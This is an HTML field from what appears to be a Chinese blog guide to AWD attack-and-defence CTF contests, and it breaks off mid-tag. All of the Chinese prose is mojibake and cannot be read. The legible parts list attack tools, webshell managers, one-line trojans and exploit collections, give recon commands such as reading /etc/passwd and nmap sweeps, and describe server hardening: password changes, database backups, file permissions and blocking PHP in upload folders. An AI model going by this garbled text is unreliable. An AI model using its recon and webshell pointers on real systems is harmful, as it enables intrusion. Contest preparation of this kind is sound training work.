            "content_html": "<p><span class=\"label success\">ä¸Šæ¬¡æ›´æ–°æ—¶é—´ï¼š2024-04-14</span><br />\nPunhacker å³å…´å®‰æ’äº†ä¸€æ¬¡ awd æ”»é˜²å¯¹æŠ—èµ›ï¼Œä¸‹åˆ 4 ç‚¹å‘é€šçŸ¥æ™šä¸Š 8 ç‚¹å¼€å§‹æ‰“ä¸¤å°æ—¶ã€‚<br />\nåŠ å›ºæ—¶é—´ä»… 10 åˆ†é’Ÿï¼Œè€Œæ²¡æœ‰æ¥è§¦è¿‡ awd ä¸çŸ¥é“å¿™æ´»ä»€ä¹ˆåœ°æ–¹ï¼Œä¸€è¾¹çœ‹ç€æ–‡ç« ä¸€è¾¹ä¸‹è½½å·¥å…·ï¼Œä»… 40 åˆ†é’Ÿè¢«æ”»ç ´ 4 æ¬¡â€¦â€¦</p>\n<h1 id=\"awdæ”»ç•¥\"><a class=\"anchor\" href=\"#awdæ”»ç•¥\">#</a> AWD æ”»ç•¥</h1>\n<h1 id=\"æ¯”èµ›æµç¨‹\"><a class=\"anchor\" href=\"#æ¯”èµ›æµç¨‹\">#</a> æ¯”èµ›æµç¨‹</h1>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>èµ›å‰å‡†å¤‡ç¯èŠ‚ï¼šæˆ‘ä»¬ä¼šåˆ†é…åˆ°å¤šä¸ªé¶æœºæœåŠ¡å™¨ï¼Œé€šå¸¸æ˜¯åˆ†é…ç»™æˆ‘ä»¬ SSH æˆ–è€… VNC çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œè¿˜æœ‰ç›¸å…³ IP ç­‰ä¿¡æ¯</p>\n</li>\n<li class=\"lvl-2\">\n<p>å®‰å…¨åŠ å›ºç¯èŠ‚ï¼šæˆ‘ä»¬éœ€è¦å…ˆè‡ªå·±å»ç™»å½•é¶æœºæœåŠ¡å™¨ï¼Œè¿›è¡Œ 30 åˆ†é’Ÿçš„å®‰å…¨åŠ å›ºï¼ˆæºç å¤‡ä»½ / å¼±å£ä»¤ä¿®æ”¹ / ä»£ç å®¡è®¡å’Œä¿®å¤ / æ¼æ´ä¿®å¤ç­‰ï¼‰</p>\n</li>\n<li class=\"lvl-2\">\n<p>è‡ªç”±æ”»å‡»ç¯èŠ‚ï¼šå®‰å…¨åŠ å›ºæ—¶é—´è¿‡åï¼Œå¼€å§‹è‡ªç”±æ”»å‡»ç¯èŠ‚ï¼Œé€šè¿‡å¯¹åˆ«çš„é˜Ÿä¼çš„é¶æœºæœåŠ¡å™¨è¿›è¡Œæ”»å‡»ï¼ˆå¼±å£ä»¤ / Web æ¼æ´ / ç³»ç»Ÿæ¼æ´ç­‰ï¼‰è·å¾— Flag è¿›è¡ŒåŠ åˆ†ï¼Œå¯¹åº”é˜Ÿä¼å¤±åˆ†</p>\n</li>\n</ul>\n<h1 id=\"èµ›å‰å‡†å¤‡\"><a class=\"anchor\" href=\"#èµ›å‰å‡†å¤‡\">#</a> èµ›å‰å‡†å¤‡</h1>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>åŸºç¡€å·¥å…·ï¼š<a href=\"https://portswigger.net/burp\">Burpsuite</a>ã€<a href=\"https://github.com/sqlmapproject/sqlmap\">sqlmap</a>ã€<a href=\"https://www.kali.org/\">kali</a>(nmapã€masscanã€ncã€searchsploitã€Metasploitã€Hydra)ã€<a href=\"https://www.xshell.com/zh/xshell/\">Xshell</a>ã€<a href=\"https://www.xshell.com/zh/xftp/\">Xftp</a>ã€<a href=\"https://github.com/raddyfiy/caidao-official-version\">èœåˆ€</a>æˆ–<a href=\"https://github.com/AntSwordProject/antSword\">èšå‰‘</a>ã€<a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>ã€Chromeã€Firefox å„ç±»æ’ä»¶ï¼ˆ<a href=\"https://addons.mozilla.org/zh-CN/firefox/addon/hackbartool/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search\">hackbar</a>ï¼‰ã€åŸºç¡€ wafï¼ˆç¬¬ä¸‰æ–¹ wafï¼‰ã€<a href=\"https://github.com/zer0h/httpscan\">httpscan</a></p>\n</li>\n<li class=\"lvl-2\">\n<p>å›¾å½¢åŒ–å·¥å…·ï¼šXterminalã€Nessusï¼ˆæ‰«æå·¥å…·ï¼‰ã€TscanPlusã€D ç›¾ã€ä»£ç å®¡è®¡å·¥å…·ï¼ˆseayã€Ripsï¼‰</p>\n</li>\n<li class=\"lvl-2\">\n<p>ä¸€å¥è¯æœ¨é©¬ï¼šphpã€aspã€aspxã€jspã€å†…å­˜é©¬</p>\n</li>\n<li class=\"lvl-2\">\n<p>ä»£ç å®¡è®¡å·¥å…·ï¼š<a href=\"https://github.com/f1tz/cnseay\">seay</a>ã€Rips</p>\n</li>\n<li class=\"lvl-2\">\n<p><a href=\"http://t.csdnimg.cn/JmIxf\">ä¸æ­»é©¬ï¼›åä¸æ­»é©¬</a></p>\n</li>\n<li class=\"lvl-2\">\n<p>æå‰å‡†å¤‡å¥½å„ç§ cms çš„ poc exp ï¼ˆå› ä¸ºå¯èƒ½ä¸å…è®¸è”ç½‘ï¼‰phpwin phpcms dz <a href=\"https://github.com/Mr-xn/Penetration_Testing_POC\">æˆ³è¿™é‡Œ</a></p>\n</li>\n</ul>\n<h1 id=\"ç™»å½•é¶æœº\"><a class=\"anchor\" href=\"#ç™»å½•é¶æœº\">#</a> ç™»å½•é¶æœº</h1>\n<h2 id=\"sshç™»å½•æ³¨æ„ç«¯å£\"><a class=\"anchor\" href=\"#sshç™»å½•æ³¨æ„ç«¯å£\">#</a> ssh ç™»å½•ï¼ˆæ³¨æ„ç«¯å£ï¼‰</h2>\n<blockquote>\n<p>windowsï¼šfinalshellã€Xshell<br />\nLinuxï¼š <code>ssh -p [port] [username]@[host]</code></p>\n</blockquote>\n<div class=\"note warning\">\n<p>æ³¨æ„ï¼šæ¯”èµ›é€šå¸¸éƒ½ä¸ä¼šç»™ root ç”¨æˆ·è€Œæ˜¯ç»™ä¸€èˆ¬ç”¨æˆ·ï¼Œæ­¤æ—¶é‡ç‚¹é˜²å¾¡ <code>/var/html/</code>  ä¸‹çš„æœåŠ¡ï¼Œä¸ç”¨èŠ±è¿‡å¤šæ—¶é—´å»ææƒ</p>\n</div>\n<h1 id=\"æ”¶é›†ä¿¡æ¯\"><a class=\"anchor\" href=\"#æ”¶é›†ä¿¡æ¯\">#</a> æ”¶é›†ä¿¡æ¯</h1>\n<h2 id=\"æ˜ç¡®linuxæœºå™¨ä¿¡æ¯\"><a class=\"anchor\" href=\"#æ˜ç¡®linuxæœºå™¨ä¿¡æ¯\">#</a> æ˜ç¡® Linux æœºå™¨ä¿¡æ¯</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">uname</span> <span class=\"token parameter variable\">-a</span>                       //ç³»ç»Ÿä¿¡æ¯</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">ps</span> <span class=\"token parameter variable\">-aux</span>                        //æŸ¥è¯¢è¿›ç¨‹ä¿¡æ¯</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">ps</span> <span class=\"token parameter variable\">-ef</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> è¿›ç¨‹åç§°         //ç­›é€‰æŒ‡å®šè¿›ç¨‹</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">id</span>                             //ç”¨äºæ˜¾ç¤ºç”¨æˆ·IDï¼Œä»¥åŠæ‰€å±ç¾¤ç»„ID</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">cat</span> /etc/passwd                //æŸ¥çœ‹ç”¨æˆ·æƒ…å†µ</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">ls</span> /home/                      //æŸ¥çœ‹ç”¨æˆ·æƒ…å†µ</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-type</span> d <span class=\"token parameter variable\">-perm</span> <span class=\"token parameter variable\">-002</span>      //å¯å†™ç›®å½•æ£€æŸ¥</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">ifconfig</span>                       //Linuxä¸ŠæŸ¥çœ‹ç½‘å¡ä¿¡æ¯</pre></td></tr></table></figure><h2 id=\"æŸ¥çœ‹æœåŠ¡\"><a class=\"anchor\" href=\"#æŸ¥çœ‹æœåŠ¡\">#</a> æŸ¥çœ‹æœåŠ¡</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">netstat</span> <span class=\"token parameter variable\">-nptl</span> <span class=\"token comment\"># æ¨èä½¿ç”¨ï¼Œæ³¨æ„ Local Address ä¸º 0.0.0.0 æ˜¯å…¬å…±è®¿é—®ï¼Œæ³¨æ„å¼±å£ä»¤ç­‰</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> <span class=\"token number\">172.20</span>.x.x/24 <span class=\"token comment\"># æœ¬æœºä½¿ç”¨</span></pre></td></tr></table></figure><p>ä¸€èˆ¬æ¥è¯´ï¼Œå„ä¸ªé¶æœºæœåŠ¡çš„ç«¯å£æ˜¯ä¸€æ ·çš„ï¼Œè·å–è‡ªå·±ä¸»æœºçš„ç«¯å£æ´»åŠ¨æƒ…å†µï¼Œå†è·å–å…¶ä»–ä¸»æœºçš„ ip åœ°å€ã€‚ç„¶åå°±å¼€å§‹æ”»å®ˆçš„ä»»åŠ¡</p>\n<h2 id=\"æŸ¥çœ‹å¼€æ”¾ç«¯å£\"><a class=\"anchor\" href=\"#æŸ¥çœ‹å¼€æ”¾ç«¯å£\">#</a> æŸ¥çœ‹å¼€æ”¾ç«¯å£</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">netstat</span>                                                       //æŸ¥çœ‹æ´»åŠ¨è¿æ¥</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">netstat</span> -ano/-a                                               //æŸ¥çœ‹ç«¯å£æƒ…å†µ</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">netstat</span> <span class=\"token parameter variable\">-anp</span>                                                  //æŸ¥çœ‹ç«¯å£</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>firewall-cmd <span class=\"token parameter variable\">--zone</span><span class=\"token operator\">=</span> public --remove-port<span class=\"token operator\">=</span><span class=\"token number\">80</span>/tcp â€“permanent   //å…³é—­ç«¯å£</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>firewall-cmd â€“reload                                          //é˜²ç«å¢™é‡å¯</pre></td></tr></table></figure><h1 id=\"é˜²å®ˆdefence\"><a class=\"anchor\" href=\"#é˜²å®ˆdefence\">#</a> é˜²å®ˆï¼ˆdefenceï¼‰</h1>\n<h2 id=\"æŸ¥æ‰¾æœ¬åœ°flag\"><a class=\"anchor\" href=\"#æŸ¥æ‰¾æœ¬åœ°flag\">#</a> æŸ¥æ‰¾æœ¬åœ° flag</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token string\">\"flag\"</span> /var/www/html/  //Linuxï¼šåœ¨Webç›®å½•ä¸‹æŸ¥æ‰¾flag</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>findstr /s /i <span class=\"token string\">\"flag\"</span> *.*       //Windowsï¼šå½“å‰ç›®å½•ä»¥åŠæ‰€æœ‰å­ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¸­æŸ¥æ‰¾<span class=\"token string\">\"flag\"</span>è¿™ä¸ªå­—ç¬¦ä¸²</pre></td></tr></table></figure><p><strong>æ¯ä¸€å¤„ flag éƒ½æœ‰æ´ï¼ŒæŸ¥çœ‹ç‰ˆæœ¬æŸ¥è¯¢å¯¹åº”çš„ cve è¿›è¡Œè¿›ä¸€æ­¥çš„åŠ å›º</strong></p>\n<h2 id=\"ä¿®æ”¹å¯†ç \"><a class=\"anchor\" href=\"#ä¿®æ”¹å¯†ç \">#</a> ä¿®æ”¹å¯†ç </h2>\n<p>è‹¥ ssh ç™»å½•æ—¶ç”¨çš„å¼±å¯†ç ï¼Œåˆ™ç™»å½•åé©¬ä¸Šæ”¹å¯†ç <br />\nå¼±å£ä»¤å¯†ç æ›´æ”¹<br />\n Mysql å¯†ç é»˜è®¤éƒ½æ˜¯ rootï¼Œphpstudy é»˜è®¤å¯†ç  123456</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>root@8 ~<span class=\"token punctuation\">]</span>$ <span class=\"token function\">passwd</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Changing password <span class=\"token keyword\">for</span> user root.</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>New password: </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Retype new password: </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>passwd: all authentication tokens updated successfully.</pre></td></tr></table></figure><p>ä¿®æ”¹å½“å‰ç”¨æˆ·çš„å¯†ç ï¼Œææƒ root åä¹Ÿå¯ä»¥ä¿®æ”¹ root å¯†ç ï¼Œè‹¥å¤±è´¥<a href=\"http://t.csdnimg.cn/FDcgD\">æˆ³è¿™é‡Œ</a><br />\nåŒæ—¶ web æœåŠ¡ã€web åå°ç®¡ç†å‘˜ã€æ•°æ®åº“ä¹Ÿéƒ½éœ€è¦ä¿®æ”¹å¯†ç ï¼ˆä¸å»ºè®®é‡å¤ä½¿ç”¨å¯†ç ï¼‰</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">set</span> password <span class=\"token keyword\">for</span> root<span class=\"token variable\">@ip</span> <span class=\"token operator\">=</span> password<span class=\"token punctuation\">(</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">-- æˆ–è€…</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">update</span> <span class=\"token keyword\">user</span> <span class=\"token keyword\">set</span> password <span class=\"token operator\">=</span> PASSWORD<span class=\"token punctuation\">(</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">where</span> <span class=\"token keyword\">user</span><span class=\"token operator\">=</span><span class=\"token string\">'root'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">-- é‡æ–°åŠ è½½æˆæƒè¡¨ï¼Œä½¿æœ€æ–°çš„æƒé™æ›´æ”¹ç”Ÿæ•ˆ</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>flush <span class=\"token keyword\">privileges</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">-- éœ€è¦ä»¥å…·æœ‰è¶³å¤Ÿæƒé™çš„ç”¨æˆ·èº«ä»½ç™»å½•åˆ° MySQL æ•°æ®åº“æ‰èƒ½æ‰§è¡Œè¿™äº›æ“ä½œ</span></pre></td></tr></table></figure><h2 id=\"å¤‡ä»½\"><a class=\"anchor\" href=\"#å¤‡ä»½\">#</a> å¤‡ä»½</h2>\n<h3 id=\"å¤‡ä»½æ•°æ®åº“\"><a class=\"anchor\" href=\"#å¤‡ä»½æ•°æ®åº“\">#</a> å¤‡ä»½æ•°æ®åº“</h3>\n<p>æ‰¾åˆ°æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ï¼š <code>mysql --help|grep 'cnf'</code> ï¼›<br />\nä¹Ÿå¯èƒ½åœ¨ <code>/var/lib/mysql</code>  ä¸‹ï¼Œæˆ–è€… database.php<br />\n æ‰¾ <code>db_name</code> ã€ <code>db_user</code>  å’Œ <code>db_passwd</code></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysqldump <span class=\"token parameter variable\">-u</span> db_user <span class=\"token parameter variable\">-p</span> db_passwd db_name <span class=\"token operator\">></span> bak.sql</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># å¤‡ä»½æŒ‡å®šæ•°æ®åº“</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>mysqldump --all-databases <span class=\"token operator\">></span> bak.sql </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># å¤‡ä»½æ‰€æœ‰æ•°æ®åº“</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>mysqldump <span class=\"token parameter variable\">-uroot</span> <span class=\"token parameter variable\">-proot</span> --all-databases --skip-lock-tables <span class=\"token operator\">></span> /tmp/db.sql</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># æ—  lock tables æƒé™çš„è§£å†³æ–¹æ³•</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>mysql <span class=\"token parameter variable\">-u</span> db_user <span class=\"token parameter variable\">-p</span> db_passwd db_name <span class=\"token operator\">&lt;</span> bak.sql</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># è¿˜åŸæŒ‡å®šæ•°æ®åº“</span></pre></td></tr></table></figure><p>è¿˜åŸæ•°æ®åº“ä¹Ÿå¯ä»¥ï¼š</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">create</span> <span class=\"token keyword\">database</span> test <span class=\"token punctuation\">;</span><span class=\"token comment\">-- å»ºç«‹è¦è¿˜åŸçš„æ•°æ®åº“</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">use</span> test<span class=\"token punctuation\">;</span><span class=\"token comment\">-- åˆ‡æ¢åˆ°åˆšåˆ›å»ºçš„æ•°æ®åº“</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>mysql<span class=\"token operator\">></span> source test<span class=\"token punctuation\">.</span><span class=\"token keyword\">sql</span><span class=\"token punctuation\">;</span><span class=\"token comment\">-- å¯¼å…¥æ•°æ®åº“</span></pre></td></tr></table></figure><h3 id=\"å…³é—­-mysql-è¿œç¨‹ç™»å½•\"><a class=\"anchor\" href=\"#å…³é—­-mysql-è¿œç¨‹ç™»å½•\">#</a> å…³é—­ MySQL è¿œç¨‹ç™»å½•ï¼š</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ mysql <span class=\"token parameter variable\">-u</span> root <span class=\"token parameter variable\">-p</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>mysql<span class=\"token operator\">></span> use mysql<span class=\"token punctuation\">;</span><span class=\"token comment\"># åˆ‡æ¢æ•°æ®åº“</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>mysql<span class=\"token operator\">></span> update user <span class=\"token builtin class-name\">set</span> <span class=\"token function\">host</span> <span class=\"token operator\">=</span> <span class=\"token string\">'localhost'</span> where <span class=\"token assign-left variable\">user</span><span class=\"token operator\">=</span><span class=\"token string\">'root'</span> and <span class=\"token assign-left variable\">host</span><span class=\"token operator\">=</span><span class=\"token string\">'%'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>mysql<span class=\"token operator\">></span> flush privileges<span class=\"token punctuation\">;</span><span class=\"token comment\"># é‡æ–°åŠ è½½æˆæƒè¡¨ï¼Œä½¿æœ€æ–°çš„æƒé™æ›´æ”¹ç”Ÿæ•ˆ</span></pre></td></tr></table></figure><p>æ£€æŸ¥éšè—ç”¨æˆ·ï¼šæŸ¥çœ‹ home ç›®å½•ä¸‹æ˜¯å¦æœ‰å…¶ä»–ç”¨æˆ·ï¼Œ/etc/passwd æ˜¯å¦æœ‰ /bin/bash çš„ç”¨æˆ·</p>\n<blockquote>\n<p>å¯¹äº MySQL çš„æ”»é˜²ï¼Œ<a href=\"https://blog.zgsec.cn/archives/26.html\">æˆ³è¿™é‡Œ</a></p>\n</blockquote>\n<p>MySQL é»˜è®¤é…ç½®æ–‡ä»¶è·¯å¾„ï¼š</p>\n<blockquote>\n<p>C:\\Program Files\\MySQL\\MySQLServer 5.1\\my.ini   ------Windows<br />\n/etc/my.cnf ------Linux<br />\n/etc/mysql/my.cnf ------Linux</p>\n</blockquote>\n<p>ä¿®æ”¹ secure_file_priv å‚æ•°ï¼ˆæ—¥å¿—åŠŸèƒ½çš„å¯¹åº”ç›®å½•ï¼‰<br />\n <code>secure_file_priv=&quot;&quot;</code></p>\n<p>é‡è½½ MySQL é…ç½®<br />\n <code>FLUSH PRIVILEGES</code> <br />\n é‡å¯ MySQL æœåŠ¡</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">service</span> mysql restart</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> systemctl restart mysql</pre></td></tr></table></figure><h2 id=\"webåŠ å›º\"><a class=\"anchor\" href=\"#webåŠ å›º\">#</a> web åŠ å›º</h2>\n<h3 id=\"è®¾ç½®æƒé™\"><a class=\"anchor\" href=\"#è®¾ç½®æƒé™\">#</a> è®¾ç½®æƒé™</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">chmod</span> 0555 /var/www/html/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">chmod</span> 0555 /var/www/html/*.php <span class=\"token comment\"># php æ–‡ä»¶éœ€è¦æ‰§è¡Œæƒé™</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">chmod</span> 0555 /var/www/html       <span class=\"token comment\"># Web æ ¹ç›®å½•è®¾ç½®åªè¯»å’Œæ‰§è¡Œæƒé™</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">chmod</span> <span class=\"token parameter variable\">-R</span> <span class=\"token number\">644</span> /var/www          <span class=\"token comment\"># -R é€’å½’è®¾ç½®</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># æ”¹å˜æ–‡ä»¶çš„å±ä¸»å’Œå±ç»„æ¥è®¾ç½®ä¸¥æ ¼çš„æƒé™</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">chown</span> <span class=\"token parameter variable\">-R</span> root:root /var/www/html/  <span class=\"token comment\"># è®¾ç½®æ‹¥æœ‰äººä¸º root:root æˆ– httpd:httpd</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">chown</span> <span class=\"token parameter variable\">-R</span> apache:apache /var/www/html/ <span class=\"token comment\"># ç¡®ä¿ apache æ‹¥æœ‰ /var/www/html/</span></pre></td></tr></table></figure><h3 id=\"ç½‘ç«™å¤‡ä»½\"><a class=\"anchor\" href=\"#ç½‘ç«™å¤‡ä»½\">#</a> ç½‘ç«™å¤‡ä»½</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">tar</span> <span class=\"token parameter variable\">-cvf</span> web.tar /var/www/html</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">zip</span> <span class=\"token parameter variable\">-q</span> <span class=\"token parameter variable\">-r</span> web.zip /var/www/html</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># å‹ç¼©æºç </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">tar</span> <span class=\"token parameter variable\">-xvf</span> web.tar <span class=\"token parameter variable\">-c</span> /var/www/html</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">unzip</span> web.zip <span class=\"token parameter variable\">-d</span> /var/www/html</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># è§£å‹ç¼©æºç </span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">mv</span> web.zip /home/xxx</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># ä¸€å®šè¦ç§»åŠ¨ä¸ç„¶æºç æ³„éœ²  </span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">scp</span> username@servername:/path/filename /tmp/local_destination  <span class=\"token comment\"># ä»æœåŠ¡å™¨ä¸‹è½½å•ä¸ªæ–‡ä»¶åˆ°æœ¬åœ°</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">scp</span> /path/local_filename username@servername:/path             <span class=\"token comment\"># ä»æœ¬åœ°ä¸Šä¼ å•ä¸ªæ–‡ä»¶åˆ°æœåŠ¡å™¨</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">scp</span> <span class=\"token parameter variable\">-r</span> username@servername:remote_dir/ /tmp/local_dir          <span class=\"token comment\"># ä»æœåŠ¡å™¨ä¸‹è½½æ•´ä¸ªç›®å½•åˆ°æœ¬åœ°</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">scp</span> <span class=\"token parameter variable\">-r</span> /tmp/local_dir username@servername:remote_dir           <span class=\"token comment\"># ä»æœ¬åœ°ä¸Šä¼ æ•´ä¸ªç›®å½•åˆ°æœåŠ¡å™¨</span></pre></td></tr></table></figure><h3 id=\"æ—¥å¿—è®°å½•\"><a class=\"anchor\" href=\"#æ—¥å¿—è®°å½•\">#</a> æ—¥å¿—è®°å½•</h3>\n<p><strong>python æ–‡ä»¶ç›‘æ§è„šæœ¬ï¼Œ<a href=\"\">ä¼ é€é—¨</a></strong></p>\n<blockquote>\n<p>/var/log/nginx/    #é»˜è®¤ Nginx æ—¥å¿—ç›®å½•<br />\n /var/log/apache/   #é»˜è®¤ Apache æ—¥å¿—ç›®å½•<br />\n /var/log/apache2/  #é»˜è®¤ Apache æ—¥å¿—ç›®å½•<br />\n /usr/local/tomcat/logs #Tomcat æ—¥å¿—ç›®å½•<br />\n tail -f xxx.log   #å®æ—¶åˆ·æ–°æ»šåŠ¨æ—¥å¿—æ–‡ä»¶</p>\n</blockquote>\n<h3 id=\"è®¾ç½®htaccessç¦ç”¨phpè„šæœ¬æ‰§è¡Œ\"><a class=\"anchor\" href=\"#è®¾ç½®htaccessç¦ç”¨phpè„šæœ¬æ‰§è¡Œ\">#</a> è®¾ç½®.htaccess ç¦ç”¨ php è„šæœ¬æ‰§è¡Œ</h3>\n<details class=\"info\"><summary>ğŸ‘‡è„šæœ¬ç‚¹å‡»å±•å¼€</summary><div>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&lt;Directory \"/var/www/html/upload\">   //æŒ‡å®šç›®å½•åç»­çš„æŒ‡ä»¤å°†åº”ç”¨äºè¯¥ç›®å½•</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Options -ExecCGI -Indexes            //ç¦ç”¨äº†ç›®å½•ä¸­çš„ CGI æ‰§è¡Œå’Œç›®å½•ç´¢å¼•ï¼ˆæ˜¾ç¤ºç›®å½•å†…å®¹åˆ—è¡¨ï¼‰åŠŸèƒ½ã€‚</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>AllowOverride None                   //ä¸å…è®¸åœ¨è¯¥ç›®å½•ä¸­ä½¿ç”¨ .htaccess æ–‡ä»¶æ¥è¦†ç›–æœåŠ¡å™¨çš„é…ç½®ã€‚</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml      </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>//è¿™ä¸¤ä¸ªæŒ‡ä»¤ç§»é™¤æŒ‡å®šæ–‡ä»¶æ‰©å±•åçš„å¤„ç†å™¨å’Œç±»å‹ã€‚</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>//åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¿™äº›æŒ‡ä»¤ä» Apache çš„å¤„ç†åˆ—è¡¨ä¸­ç§»é™¤äº†ä¸ PHP ç›¸å…³çš„æ‰©å±•åå’ŒæœåŠ¡å™¨ç«¯åŒ…å«ï¼ˆSSIï¼‰æ–‡ä»¶ç±»å‹ã€‚</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>php_flag engine off     //è¿™ä¸ªæŒ‡ä»¤å°† PHP çš„å¼•æ“æ ‡å¿—ï¼ˆengineï¼‰è®¾ç½®ä¸ºå…³é—­çŠ¶æ€ï¼Œä»è€Œç¦ç”¨äº†åœ¨è¯¥ç›®å½•ä¸­æ‰§è¡Œ PHP è„šæœ¬çš„èƒ½åŠ›ã€‚</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FilesMatch</span> <span class=\"token 